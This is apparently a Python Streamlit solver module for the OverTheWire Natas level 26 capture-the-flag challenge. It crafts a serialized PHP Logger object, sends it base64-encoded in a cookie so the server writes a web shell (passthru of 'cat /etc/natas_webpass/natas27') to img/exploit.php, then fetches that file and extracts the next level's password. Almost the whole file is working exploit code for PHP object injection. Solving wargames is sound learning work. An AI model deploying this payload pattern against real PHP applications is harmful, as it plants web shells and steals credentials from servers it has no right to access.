import streamlit as st
import re
import base64

def run(context, session, base_url):
    st.info("Targeting PHP Deserialization / Object Injection Vulnerabilities...")
    
    # 1. Align active level credentials cleanly
    username = "natas26"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    target_url = "http://natas26.natas.labs.overthewire.org/index.php"
    
    # 2. Craft the serialized PHP Object string
    # We target the 'Logger' class, defining a custom file write path and a shell payload
    # Structure: O:6:"Logger":3:{s:15:"\0Logger\0logFile";s:15:"img/exploit.php";s:15:"\0Logger\0initMsg";s:0:"";s:15:"\0Logger\0exitMsg";s:53:"<?php passthru('cat /etc/natas_webpass/natas27'); ?>";}
    # Note: Since the properties are private, PHP pads the keys with null bytes (\x00)
    
    serialized_payload = (
        'O:6:"Logger":3:{'
        's:15:"\x00Logger\x00logFile";s:15:"img/exploit.php";'
        's:15:"\x00Logger\x00initMsg";s:0:"";'
        's:15:"\x00Logger\x00exitMsg";s:53:"<?php passthru(\'cat /etc/natas_webpass/natas27\'); ?>";'
        '}'
    )
    
    # Base64 encode the string payload to fit the 'drawing' cookie specification format
    encoded_cookie = base64.b64encode(serialized_payload.encode('utf-8')).decode('utf-8')
    st.write(f"📡 Generated weaponized deserialization payload string.")
    
    try:
        # 3. Stage 1: Pass the cookie to drop the web shell file onto the server
        session.cookies.set("drawing", encoded_cookie)
        st.write("🔄 Transmitting object matrix via session state cookie...")
        session.get(target_url, timeout=10)
        
        # 4. Stage 2: Trigger execution by requesting our newly created PHP file
        exploit_file_url = "http://natas26.natas.labs.overthewire.org/img/exploit.php"
        st.write(f"📡 Querying dynamic script execution path: `{exploit_file_url}`")
        
        # Clear the payload cookie so it doesn't interfere with reading the output
        session.cookies.clear()
        response = session.get(exploit_file_url, timeout=10)
        
        # 5. Extract and filter the 32/64 character password flag
        all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
        new_tokens = [t for t in all_tokens if t != current_password]
        
        if new_tokens:
            st.success("🎯 PHP Object Injection executed successfully!")
            st.success("🎯 Level 26 challenge resolved successfully!")
            st.code(f"Natas 27 Password: {new_tokens[0]}")
        else:
            st.error("The payload was stored, but the execution file returned no credential flags.")
            with st.expander("Examine Remote Response Matrix"):
                st.code(response.text)
                
    except Exception as e:
        st.error(f"Execution failed due to programmatic error: {str(e)}")